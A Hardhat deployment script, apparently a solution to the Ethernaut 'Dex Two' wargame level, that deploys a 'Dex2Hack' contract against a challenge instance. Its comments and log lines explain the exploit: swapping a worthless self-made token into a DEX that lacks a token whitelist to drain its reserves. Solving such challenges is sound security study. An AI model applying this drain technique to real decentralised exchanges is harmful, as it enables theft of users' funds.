// This script exports the contract bytecode and ABI
const fs = require('fs');
const path = require('path');
const { ethers, upgrades, network } = require("hardhat");
const { withRetry } = require("./utils/retry");
const hre = require("hardhat");
require('dotenv').config();

// There is no validation, i can swap any erc20 token for the victim token
// so i can just create a malicious token and swap it
// send 1 evil token to the DEX, then execute the drain
// `swapAmount = (amount * to_balance) / from_balance` 
// 1 evil token for token1, to_balance 100 token1 from_Balance 1 DEX evil token == swapAmount = (1 x 100) / 1 = 100
// so i get all 100 token1 for just worthless evil token
// there is no whitelist, super favorable ratio (1:1 for my token vs 100:1 for the victim token), get it all for 2 evil tokens
async function main() {
    // Clean and recompile before deploying
    await hre.run("clean");
    await hre.run("compile");
    
  // Validate required environment variables
  if (!process.env.LEDGER_ACCOUNT) {
    console.error("\n❌ ERROR: LEDGER_ACCOUNT environment variable is not set in .env file");
    console.error("Please add LEDGER_ACCOUNT=0xYourLedgerAddress to your .env file");
    process.exit(1);
  }
  
  if (!process.env.INSTANCE_ADDRESS) {
    console.error("\n❌ ERROR: INSTANCE_ADDRESS environment variable is not set in .env file");
    console.error("Please add INSTANCE_ADDRESS=0xYourEthernautInstance to your .env file");
    process.exit(1);
  }

  const instanceAddress = process.env.INSTANCE_ADDRESS;

  console.log("Deploying Dex2Hack contract");
  console.log("Network:", network.name);
  console.log("Chain ID:", network.config.chainId);
  
  // Get the signer account with retry
  const [deployer] = await withRetry(
    async () => ethers.getSigners(),
    { maxRetries: 3, initialDelay: 5000 }
  );
  
  const deployerAddress = await withRetry(
    async () => deployer.getAddress(),
    { maxRetries: 3, initialDelay: 5000 }
  );
  
  console.log("Deploying with account:", deployerAddress);
  
  // Show Ledger instructions if we're on a real network (not localhost/hardhat)
  if (network.name !== "hardhat" && network.name !== "localhost") {
    console.log("\n⚠️ IMPORTANT: If using a Ledger or other hardware wallet, please ensure:");
    console.log("  1. Your device is connected via USB");
    console.log("  2. The device is unlocked");
    console.log("  3. The Ethereum app is open");
    console.log("  4. Contract data is allowed in the Ethereum app settings\n");
  }
  
  // Deploy Dex2Hack contract with retry
  console.log("\nDeploying Dex2Hack to target instance", instanceAddress);
  const Dex2Hack = await withRetry(
    async () => ethers.getContractFactory("Dex2Hack"),
    { maxRetries: 3, initialDelay: 5000 }
  );

  const dex2Hack = await withRetry(
    async () => Dex2Hack.deploy(instanceAddress, {
      gasLimit: 5000000, // Set a higher gas limit to ensure the transaction goes through
    }),
    { 
      maxRetries: 3, 
      initialDelay: 5000,
      onRetry: (attempt, error) => {
        console.log(`Retry ${attempt}: Attempting to deploy again...`);
        console.log(`Previous error: ${error.message}`);
      }
    }
  );
  
  await withRetry(
    async () => dex2Hack.waitForDeployment(),
    { maxRetries: 3, initialDelay: 5000 }
  );
  
  const deployedAddress = await withRetry(
    async () => dex2Hack.getAddress(),
    { maxRetries: 3, initialDelay: 5000 }
  );
  
  console.log("Dex2Hack deployed to:", deployedAddress);
  
  // Get transaction hash for Etherscan link
  const deployTx = dex2Hack.deploymentTransaction();
  console.log("Deployment transaction hash:", deployTx.hash);
  
  // Generate Etherscan URL for non-local networks
  if (network.name !== "hardhat" && network.name !== "localhost") {
    let etherscanBaseUrl;
    if (network.name === "sepolia") {
      etherscanBaseUrl = "https://sepolia.etherscan.io";
    } else if (network.name === "mainnet") {
      etherscanBaseUrl = "https://etherscan.io";
    } else {
      etherscanBaseUrl = `https://${network.name}.etherscan.io`;
    }
    
    const etherscanTxUrl = `${etherscanBaseUrl}/tx/${deployTx.hash}`;
    const etherscanContractUrl = `${etherscanBaseUrl}/address/${deployedAddress}`;
    
    console.log("View transaction on Etherscan:", etherscanTxUrl);
    console.log("View contract on Etherscan:", etherscanContractUrl);
  }
  
  console.log("\n==== VERIFICATION ====");
  console.log("✅ Dex2Hack contract deployed successfully!");
  console.log("During contract deployment, the attack was executed by:");
  console.log("1. Creating a malicious token");
  console.log("2. Transferring 1 token to the Dex");
  console.log("3. Executing swaps to drain all tokens from the Dex");
  console.log("4. Sending the tokens to your address");
  console.log("\nChallenge completed!");
}

// We recommend this pattern to be able to use async/await everywhere
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
}); 